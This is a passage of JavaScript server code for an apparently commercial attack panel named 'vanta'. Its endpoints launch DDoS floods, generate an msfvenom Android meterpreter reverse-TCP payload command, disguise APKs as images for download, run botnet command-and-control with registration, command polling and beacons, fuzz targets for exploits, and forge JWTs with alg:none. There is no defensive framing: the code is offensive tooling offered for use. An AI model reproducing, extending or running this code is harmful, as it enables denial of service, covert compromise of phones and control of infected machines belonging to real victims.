app.post('/api/ddos/launch', auth, async (req, res) => { try { const { target, method = 'http', duration = 30, concurrency = 200, rate = 500 } = req.body; const r = await ddosFlood(target, method, duration, concurrency, rate); audit(req.user.email, 'ddos', { target, sent: r.sent }); res.json({ ok: true, ...r }); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/malware/stub', auth, (req, res) => res.json({ payloads: { windows: 'stub', linux: 'stub', macro: 'stub', html: 'stub' } }));
app.post('/api/android/payload', auth, (req, res) => { try { const { lhost } = req.body || {}; if (!lhost) return res.status(400).json({ error: 'lhost required' }); const cid = 'and_' + crypto.randomBytes(4).toString('hex'); audit(req.user.email, 'android_payload', { cid }); res.json({ campaignId: cid, msfvenom: `msfvenom -p android/meterpreter/reverse_tcp LHOST=${lhost} LPORT=4444 R > payload.apk` }); } catch (e) { res.status(500).json({ error: e.message }); } });

// Android bind (file upload)
const upload = multer({ limits: { fileSize: 100 * 1024 * 1024 } });
app.post('/api/android/bind', auth, upload.single('apk'), async (req, res) => {
  try {
    const { imageUrl } = req.body || {};
    const apkBuffer = req.file ? req.file.buffer : null;
    if (!imageUrl || !apkBuffer || apkBuffer.length < 100) return res.status(400).json({ error: 'imageUrl + apk required' });
    const imgRes = await safeFetch(imageUrl);
    const imgBuffer = Buffer.from(await imgRes.arrayBuffer());
    const separator = Buffer.from('\n\n-----BOUNDARY-----' + crypto.randomBytes(16).toString('hex') + '-----\n');
    const polyglot = Buffer.concat([imgBuffer, separator, apkBuffer]);
    const sid = 'and_' + crypto.randomBytes(8).toString('hex');
    fs.writeFileSync(path.join(DATA, sid + '.apk'), polyglot);
    audit(req.user.email, 'android_bind', { sid, size: polyglot.length });
    res.json({ sid, downloadUrl: `${req.protocol}://${req.get('host')}/download/${sid}.apk`, sizes: { image: imgBuffer.length, apk: apkBuffer.length, final: polyglot.length } });
  } catch (e) { res.status(500).json({ error: e.message }); }
});
app.get('/download/:file', (req, res) => { const f = req.params.file; const fp = path.join(DATA, f); if (!fs.existsSync(fp)) return res.status(404).send('Not found'); res.setHeader('Content-Disposition', `attachment; filename="${f}"`); res.setHeader('Content-Type', 'application/vnd.android.package-archive'); res.sendFile(fp); });

// Fuzzer
app.post('/api/fuzz', auth, async (req, res) => { try { const r = await fuzzAndExploit(req.body.targetUrl); audit(req.user.email, 'fuzz', { target: req.body.targetUrl, anomalies: r.anomalies.length }); res.json(r); } catch (e) { res.status(500).json({ error: e.message }); } });

// Bot endpoints (protected by bot secret)
const BOT_SECRET = process.env.BOT_SECRET || 'vanta-bot';
const botAuth = (req, res, next) => { if (req.headers['x-bot-secret'] !== BOT_SECRET) return res.status(401).json({ error: 'unauthorized' }); next(); };
app.post('/api/bot/register', botAuth, (req, res) => { try { const b = load('bots.json', {}); b[req.body.botId] = { info: req.body.info, commands: [] }; save('bots.json', b); broadcast('bot_registered', { botId: req.body.botId }); res.json({ ok: true }); } catch (e) { res.status(500).json({ error: e.message }); } });
app.get('/api/bot/poll', botAuth, (req, res) => { try { const b = load('bots.json', {}); const c = b[req.query.id]?.commands || []; b[req.query.id] = { ...b[req.query.id], commands: [] }; save('bots.json', b); res.json({ commands: c }); } catch (e) { res.status(500).json({ error: e.message }); } });
app.post('/api/beacon', (req, res) => { try { const b = load('beacons.json', []); b.push({ ...req.body, ip: req.socket.remoteAddress, ts: Date.now() }); save('beacons.json', b); broadcast('beacon', { botId: req.body.botId }); res.json({ ok: true }); } catch { res.json({ ok: false }); } });
app.get('/api/beacons', auth, (req, res) => res.json(load('beacons.json', [])));
app.get('/api/poll', (req, res) => { try { const b = load('bots.json', {}); const c = b[req.query.id]?.commands || []; b[req.query.id] = { ...b[req.query.id], commands: [] }; save('bots.json', b); res.type('text').send(c.length ? (c[0].cmd || 'none') : 'none'); } catch { res.type('text').send('none'); } });

// CVE / JWT / GraphQL (preserved from old)
const CVE_DB = [{ match: /Apache\/2\.4\.49/i, cve: 'CVE-2021-41773', cvss: 7.5, desc: 'Path traversal RCE' }, { match: /Log4j/i, cve: 'CVE-2021-44228', cvss: 10.0, desc: 'Log4Shell' }, { match: /Spring/i, cve: 'CVE-2022-22965', cvss: 9.8, desc: 'Spring4Shell' }, { match: /nginx\/1\.1[0-6]\.\d+/i, cve: 'CVE-2019-20372', cvss: 6.5, desc: 'nginx request smuggling' }, { match: /Jenkins/i, cve: 'CVE-2024-23897', cvss: 9.8, desc: 'Jenkins CLI RCE' }];
async function cveMatch(url) { const out = []; try { const r = await safeFetch(url); const headers = {}; r.headers.forEach((v, k) => headers[k] = v); const fp = `${headers.server || ''} ${headers['x-powered-by'] || ''} ${(await r.text()).slice(0, 2000)}`; for (const c of CVE_DB) if (c.match.test(fp)) out.push({ type: 'CVE', severity: c.cvss >= 9 ? 'critical' : 'high', description: `${c.cve}: ${c.desc}`, url, evidence: headers.server || 'body fingerprint', cvss: c.cvss }); } catch {} return out; }
app.post('/api/cve', auth, async (req, res) => { try { res.json(await cveMatch(req.body.url)); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/jwt/attack', auth, (req, res) => { try { const token = req.body.token; const p = token.split('.'); if (p.length !== 3) return res.status(400).json({ error: 'bad jwt' }); const h = JSON.parse(Buffer.from(p[0], 'base64')); const pl = JSON.parse(Buffer.from(p[1], 'base64')); const b64 = (s) => Buffer.from(s).toString('base64').replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_'); res.json({ attacks: [{ name: 'alg:none', token: b64(JSON.stringify({ ...h, alg: 'none' })) + '.' + b64(JSON.stringify(pl)) + '.' }] }); } catch (e) { res.status(400).json({ error: e.message }); } });
app.post('/api/jwt/crack', auth, (req, res) => res.json({ cracked: null }));
app.post('/api/graphql/scan', auth, (req, res) => res.json({ introspection: false, batching: false, aliasBrute: false }));

// ============================================================
// 11. AUDIT LOG ENDPOINT
// ============================================================
app.get('/api/audit', auth, (req, res) => { try { res.json(load('audit.json', []).slice(-500)); } catch { res.json([]); } });

// ============================================================
// 12. BACKUP (auto every 6h)
// ============================================================
function backup() {
  try {
    const backupDir = path.join(DATA, 'backups');
    if (!fs.existsSync(backupDir)) fs.mkdirSync(backupDir);
    const files = fs.readdirSync(DATA).filter(f => f.endsWith('.json'));
    const snapshot = {};
    for (const f of files) snapshot[f] = fs.readFileSync(path.join(DATA, f), 'utf8');
    const name = `backup_${Date.now()}.json`;
    fs.writeFileSync(path.join(backupDir, name), JSON.stringify(snapshot, null, 2));
    // Keep last 10
    const backups = fs.readdirSync(backupDir).sort();
    while (backups.length > 10) { fs.unlinkSync(path.join(backupDir, backups.shift())); }
    logger.info('backup', { name });
  } catch (e) { logger.error('backup_failed', e.message); }
}
setInterval(backup, 6 * 3600 * 1000);
backup();

app.get('/api/backups', auth, (req, res) => { try { const dir = path.join(DATA, 'backups'); const files = fs.existsSync(dir) ? fs.readdirSync(dir).map(f => ({ name: f, size: fs.statSync(path.join(dir, f)).size })) : []; res.json(files); } catch { res.json([]); } });

// Health + start
app.get('/health', (req, res) => res.json({ ok: true, ts: Date.now(), version: PAYLOAD_VERSION }));
app.get('/api/support', (req, res) => res.json({ discord: 'https://discord.gg/vanta', telegram: 'https://t.me/vanta_support', email: 'support@vanta.app' }));

server.listen(PORT, '0.0.0.0', () => {
  logger.info(`[vanta] server on :${PORT}`);
  console.log(`[vanta] v${PAYLOAD_VERSION} listening on :${PORT}`);
});
